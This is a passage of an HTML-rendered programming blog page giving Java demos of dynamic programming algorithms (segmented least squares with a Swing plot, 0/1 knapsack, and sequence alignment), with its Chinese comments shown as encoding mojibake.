class="hljs-number">2</span>][maxS];<br>    <span class="hljs-comment">//é™æ€å—åˆå§‹åŒ–optCçš„åˆå§‹è¾¹ç•Œå€¼ä¸º0</span><br>    <span class="hljs-keyword">static</span> {<br>        optC[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SLMSDemo</span><span class="hljs-params">()</span>{}<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">SLMSDemo</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SLMSDemo</span>();<br>        <span class="hljs-comment">//è®¡ç®—a,b,eC</span><br>        ComputeE();<br>        <span class="hljs-comment">//è®¡ç®—æ¯ä¸ª1...jå­é›†çš„æœ€ä¼˜æ‹Ÿåˆä»£ä»·</span><br>        mc = ComputeOPT();<br>        <span class="hljs-comment">//æ˜¾ç¤ºè¾“å‡ºè®¡ç®—ç»“æœ</span><br>        DrawPanel rd= <span class="hljs-keyword">new</span> <span class="hljs-title class_">DrawPanel</span>(P,a,b,mS,mc);<br>        frame.add(rd);<br>        frame.setSize(<span class="hljs-number">400</span>,<span class="hljs-number">400</span>);<br>        frame.setTitle(<span class="hljs-string">"åˆ†æ®µæœ€å°äºŒä¹˜æ¼”ç¤ºç¨‹åº"</span>);<br>        frame.setLocationRelativeTo(<span class="hljs-literal">null</span>);<br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    }<br><br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ComputeE</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=j;i++){<br>                <span class="hljs-type">int</span> xySum=<span class="hljs-number">0</span>;<br>                <span class="hljs-type">int</span> xSum=<span class="hljs-number">0</span>;<br>                <span class="hljs-type">int</span> ySum=<span class="hljs-number">0</span>;<br>                <span class="hljs-type">int</span> xxSum=<span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=i;k&lt;=j;k++){<br>                    xySum+=P[<span class="hljs-number">0</span>][k]*P[<span class="hljs-number">1</span>][k];<br>                    xxSum+=P[<span class="hljs-number">0</span>][k]*P[<span class="hljs-number">0</span>][k];<br>                    xSum+=P[<span class="hljs-number">0</span>][k];<br>                    ySum+=P[<span class="hljs-number">1</span>][k];<br>                }<br>                <span class="hljs-type">double</span> zj=((j-i+<span class="hljs-number">1</span>)*xxSum-xSum*xSum);<br>                <span class="hljs-keyword">if</span>(zj!=<span class="hljs-number">0</span>){<br>                    a[i][j]=((j-i+<span class="hljs-number">1</span>)*xySum-xSum*ySum)/zj;<br>                }<span class="hljs-keyword">else</span>{<br>                    a[i][j]=MAXV;<br>                }<br>                b[i][j]=(ySum-a[i][j]*xSum)/(j-i+<span class="hljs-number">1</span>);<br>                <span class="hljs-type">int</span> eSum=<span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=i;k&lt;=j;k++){<br>                    eSum+=(P[<span class="hljs-number">1</span>][k]-P[<span class="hljs-number">0</span>][k]*a[i][j]-b[i][j])*(P[<span class="hljs-number">1</span>][k]-P[<span class="hljs-number">0</span>][k]*a[i][j]-b[i][j]);<br>                }<br>                eC[i][j]=eSum;<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ComputeOPT</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++){<br>            <span class="hljs-type">double</span> emin=MAXV;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=j;i++){<br>                <span class="hljs-type">double</span> zj=eC[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]+C+optC[i-<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span>(zj&lt;emin){<br>                    emin=zj;<br>                }<br>            }<br>            optC[j]=emin;<br>            <span class="hljs-comment">//System.out.println(optC[j]+"");</span><br>        }<br>        <span class="hljs-type">int</span> m=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> j=n;<br>        <span class="hljs-keyword">while</span> (j&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-type">double</span> emin=MAXV;<br>            <span class="hljs-type">int</span> imin=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=j;i++){<br>                <span class="hljs-type">double</span> zj=eC[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]+C+optC[i-<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span>(zj&lt;emin){<br>                    emin=zj;<br>                    imin=i;<br>                }<br>            }<br>            mS[<span class="hljs-number">0</span>][m]=imin-<span class="hljs-number">1</span>;<br>            mS[<span class="hljs-number">1</span>][m]=j-<span class="hljs-number">1</span>;<br>            m=m+<span class="hljs-number">1</span>;<br>            j=imin-<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-keyword">return</span> m;<br>    }<br>}<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DrawPanel</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JPanel</span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> widthP=<span class="hljs-number">400</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> tw=<span class="hljs-number">40</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> heightP=widthP-tw;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> width=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> height=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> Color axisColor=Color.BLACK;<br>    <span class="hljs-keyword">private</span> Color scatColor=Color.BLUE;<br>    <span class="hljs-keyword">private</span> Point origin;<br>    <span class="hljs-keyword">private</span> Point originA;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> cx=<span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> cy=<span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> beishu;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> sC=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[][] P;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span>[][] a;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span>[][] b;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[][] mS;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> mc;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DrawPanel</span><span class="hljs-params">()</span>{<br>        originA=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Point</span>(<span class="hljs-number">2</span>,<span class="hljs-number">380</span>-<span class="hljs-number">2</span>);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DrawPanel</span><span class="hljs-params">(Point p)</span>{<br>        origin=p;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DrawPanel</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span>{<br>        origin=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Point</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>        width=x;<br>        height=y;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DrawPanel</span><span class="hljs-params">(<span class="hljs-type">int</span>[][]P,<span class="hljs-type">double</span>[][]a,<span class="hljs-type">double</span>[][]b,<span class="hljs-type">int</span>[][]mS,<span class="hljs-type">int</span> mc)</span>{<br>        cx=<span class="hljs-number">5</span>;<br>        cy=<span class="hljs-number">5</span>;<br>        sC=<span class="hljs-number">16</span>;<br>        <span class="hljs-built_in">this</span>.P=P;<br>        <span class="hljs-built_in">this</span>.a=a;<br>        <span class="hljs-built_in">this</span>.b=b;<br>        <span class="hljs-built_in">this</span>.mS=mS;<br>        <span class="hljs-built_in">this</span>.mc=mc;<br>        beishu=<span class="hljs-number">2</span>;<br>        originA=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Point</span>(cx,<span class="hljs-built_in">this</span>.heightP-cy);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getArea</span><span class="hljs-params">()</span>{<br>        <span class="hljs-keyword">return</span> width*height;<br>    }<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintComponent</span><span class="hljs-params">(Graphics g)</span>{<br>        paintXY(g);<br>        paintScatters(g);<br>        paintLines(g);<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintXY</span><span class="hljs-params">(Graphics g)</span>{<br>        g.setColor(axisColor);<br>        g.drawLine(originA.x,originA.y,originA.x+widthP-cx,originA.y);<br>        g.drawLine(originA.x,originA.y,originA.x,originA.y-heightP+cy+tw);<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintScatters</span><span class="hljs-params">(Graphics g)</span>{<br>        g.setColor(scatColor);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;sC;i++){<br>            g.drawOval(originA.x+P[<span class="hljs-number">0</span>][i]*beishu,originA.y-P[<span class="hljs-number">1</span>][i]*beishu,cx,cy);<br>        }<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintLines</span><span class="hljs-params">(Graphics g)</span>{<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;mc;i++){<br>            <span class="hljs-type">int</span> y1=(<span class="hljs-type">int</span>)((a[mS[<span class="hljs-number">0</span>][i]][mS[<span class="hljs-number">1</span>][i]]*P[<span class="hljs-number">0</span>][mS[<span class="hljs-number">0</span>][i]]+b[mS[<span class="hljs-number">0</span>][i]][mS[<span class="hljs-number">1</span>][i]])*beishu);<br>            <span class="hljs-type">int</span> x1=P[<span class="hljs-number">0</span>][mS[<span class="hljs-number">0</span>][i]]*beishu;<br>            <span class="hljs-type">int</span> y2=((<span class="hljs-type">int</span>)(a[mS[<span class="hljs-number">0</span>][i]][mS[<span class="hljs-number">1</span>][i]]*P[<span class="hljs-number">0</span>][mS[<span class="hljs-number">1</span>][i]]+b[mS[<span class="hljs-number">0</span>][i]][mS[<span class="hljs-number">1</span>][i]])*beishu);<br>            <span class="hljs-type">int</span> x2=P[<span class="hljs-number">0</span>][mS[<span class="hljs-number">1</span>][i]]*beishu;<br>            g.setColor(Color.RED);<br>            g.drawLine(originA.x+x1,originA.y-y1,originA.x+x2,originA.y-y2);<br>        }<br>    }<br><br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="èƒŒåŒ…é—®é¢˜"><a href="#èƒŒåŒ…é—®é¢˜" class="headerlink" title="èƒŒåŒ…é—®é¢˜"></a>èƒŒåŒ…é—®é¢˜</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KnapsackDemo</span> {<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">W</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br>    <span class="hljs-comment">//static int[] iW={6,17,8,21,4,7,8,12,9,11};</span><br>    <span class="hljs-comment">//static int[] iV={7,21,14,23,6,6,9,11,8,14};</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] iW = {<span class="hljs-number">6</span>, <span class="hljs-number">17</span>, <span class="hljs-number">8</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>};<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] iV = {<span class="hljs-number">7</span>, <span class="hljs-number">21</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>, <span class="hljs-number">14</span>};<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] optC = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n + <span class="hljs-number">1</span>][W + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">sN</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">vG</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">wG</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] iS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n];<br><br>    <span class="hljs-keyword">static</span> {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt;= W; j++) {<br>            optC[<span class="hljs-number">0</span>][j] = <span class="hljs-number">0</span>;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        computeOPT();<br>        System.out.println(<span class="hljs-string">"æ‰€é€‰ç‰©ä»¶ç¼–å·ä¸º"</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; n; i++) {<br>            System.out.print(iS[i] + <span class="hljs-string">" "</span>);<br>        }<br>        System.out.print(<span class="hljs-string">"\n"</span>);<br>        System.out.println(<span class="hljs-string">"å ç”¨æ€»ç©ºé—´ä¸º: "</span> + wG);<br>        System.out.println(<span class="hljs-string">"æ€»ä»·å€¼ä¸º: "</span> + vG);<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeOPT</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt;= n; j++) {<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; w &lt;= W; w++) {<br>                <span class="hljs-keyword">if</span> (w &lt; iW[j - <span class="hljs-number">1</span>]) {<br>                    optC[j][w] = optC[j - <span class="hljs-number">1</span>][w];<br>                } <span class="hljs-keyword">else</span> {<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">zj</span> <span class="hljs-operator">=</span> iV[j - <span class="hljs-number">1</span>] + optC[j - <span class="hljs-number">1</span>][w - iW[j - <span class="hljs-number">1</span>]];<br>                    <span class="hljs-keyword">if</span> (zj &gt; optC[j - <span class="hljs-number">1</span>][w]) {<br>                        optC[j][w] = zj;<br>                    } <span class="hljs-keyword">else</span> {<br>                        optC[j][w] = optC[j - <span class="hljs-number">1</span>][w];<br>                    }<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> n;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> W;<br>        <span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span>) {<br>            <span class="hljs-keyword">if</span> (w &lt; iW[j - <span class="hljs-number">1</span>]) {<br>                j = j - <span class="hljs-number">1</span>;<br>            } <span class="hljs-keyword">else</span> {<br>                <span class="hljs-type">int</span> <span class="hljs-variable">zj</span> <span class="hljs-operator">=</span> iV[j - <span class="hljs-number">1</span>] + optC[j - <span class="hljs-number">1</span>][w - iW[j - <span class="hljs-number">1</span>]];<br>                <span class="hljs-keyword">if</span> (zj &gt; optC[j - <span class="hljs-number">1</span>][w]) {<br>                    iS[sN] = j;<br>                    sN = sN + <span class="hljs-number">1</span>;<br>                    vG = vG + iV[j - <span class="hljs-number">1</span>];<br>                    wG = wG + iW[j - <span class="hljs-number">1</span>];<br>                    w = w - iW[j - <span class="hljs-number">1</span>];<br>                    j = j - <span class="hljs-number">1</span>;<br>                } <span class="hljs-keyword">else</span> {<br>                    j = j - <span class="hljs-number">1</span>;<br>                }<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="ä¸²åŒ¹é…"><a href="#ä¸²åŒ¹é…" class="headerlink" title="ä¸²åŒ¹é…"></a>ä¸²åŒ¹é…</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SequenceAlignmentDemo</span> {<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> n=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">static</span> String X=<span class="hljs-string">"governance"</span>;<br>    <span class="hljs-keyword">static</span> String Y=<span class="hljs-string">"government"</span>;<br>    <span class="hljs-keyword">static</span> String aY=<span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">static</span> String aX=<span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> d=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] A=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">26</span>][<span class="hljs-number">26</span>];<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] M=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][m];<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> mL=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">static</span>{<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">26</span>;j++){<br>                <span class="hljs-keyword">if</span>(i==j){<br>                    A[i][j]=<span class="hljs-number">0</span>;<br>                }<span class="hljs-keyword">else</span>{<br>                    A[i][j]=d*<span class="hljs-number">2</span>;<br>                }<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">static</span> String elpha[]={<span class="hljs-string">"a"</span>,<span class="hljs-string">"b"</span>,<span class="hljs-string">"c"</span>,<span class="hljs-string">"d"</span>,<span class="hljs-string">"e"</span>,<span class="hljs-string">"f"</span>,<span class="hljs-string">"g"</span>,<span class="hljs-string">"h"</span>,<span class="hljs-string">"i"</span>,<span class="hljs-string">"j"</span>,<span class="hljs-string">"k"</span>,<span class="hljs-string">"l"</span>,<span class="hljs-string">"m"</span>,<span class="hljs-string">"n"</span>,<br>                          <span class="hljs-string">"o"</span>,<span class="hljs-string">"p"</span>,<span class="hljs-string">"q"</span>,<span class="hljs-string">"r"</span>,<span class="hljs-string">"s"</span>,<span class="hljs-string">"t"</span>,<span class="hljs-string">"u"</span>,<span class="hljs-string">"v"</span>,<span class="hljs-string">"w"</span>,<span class="hljs-string">"x"</span>,<span class="hljs-string">"y"</span>,<span class="hljs-string">"z"</span>};<br>    <span class="hljs-keyword">static</span> Integer index[]={<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<br>                            <span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>};<br>    <span class="hljs-keyword">static</span> Hashtable&lt;String,Integer&gt; ht=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;String,Integer&gt;();<br>    <span class="hljs-keyword">static</span>{<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++){<br>            ht.put(elpha[i],index[i]);<br>        }<br>    }<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] optC=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[m+<span class="hljs-number">1</span>][n+<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">static</span> {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=m;j++){<br>            optC[j][<span class="hljs-number">0</span>]=j*d;<br>        }<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=n;j++){<br>            optC[<span class="hljs-number">0</span>][j]=j*d;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        computeOPT();<br>        System.out.println(<span class="hljs-string">"æœ€ä¼˜åŒ¹é…ä»£ä»·å€¼ä¸º: "</span>+optC[m][n]);<br>        System.out.println(<span class="hljs-string">"æœ€ä¼˜åŒ¹é…é›†ä¸º: "</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;mL;i++){<br>            System.out.print(<span class="hljs-string">"("</span>+M[<span class="hljs-number">0</span>][i]+<span class="hljs-string">","</span>+M[<span class="hljs-number">1</span>][i]+<span class="hljs-string">")"</span>);<br>            <span class="hljs-keyword">if</span>(Math.floorMod(i+<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>)<br>                System.out.print(<span class="hljs-string">"\n"</span>);<br>        }<br>        System.out.print(<span class="hljs-string">"\n"</span>);<br>        System.out.println(aX);<br>        System.out.println(aY);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeOPT</span><span class="hljs-params">()</span>{<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++){<br>                <span class="hljs-type">int</span> zj1=A[(ht.get(X.substring(i-<span class="hljs-number">1</span>,i))).intValue()][(ht.get(Y.substring(j-<span class="hljs-number">1</span>,j))).intValue()]<br>                        +optC[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>                <span class="hljs-type">int</span> zj2=d+optC[i-<span class="hljs-number">1</span>][j];<br>                <span class="hljs-type">int</span> zj3=d+optC[i][j-<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span>(zj1&lt;zj2&amp;&amp;zj1&lt;zj3){<br>                    optC[i][j]=zj1;<br>                }<br>                <span class="hljs-keyword">if</span> (zj2&lt;=zj1&amp;&amp;zj2&lt;=zj3){<br>                    optC[i][j]=zj2;<br>                }<br>                <span class="hljs-keyword">if</span>(zj3&lt;=zj1&amp;&amp;zj3&lt;=zj2){<br>                    optC[i][j]=zj3;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> i=m;<br>        <span class="hljs-type">int</span> j=n;<br>        <span class="hljs-keyword">while</span> (i&gt;=<span class="hljs-number">1</span>||j&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-type">int</span> zj1=A[(ht.get(X.substring(i-<span class="hljs-number">1</span>,i))).intValue()][(ht.get(Y.substring(j-<span class="hljs-number">1</span>,j))).intValue()]<br>                    +optC[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span> zj2=d+optC[i-<span class="hljs-number">1</span>][j];<br>            <span 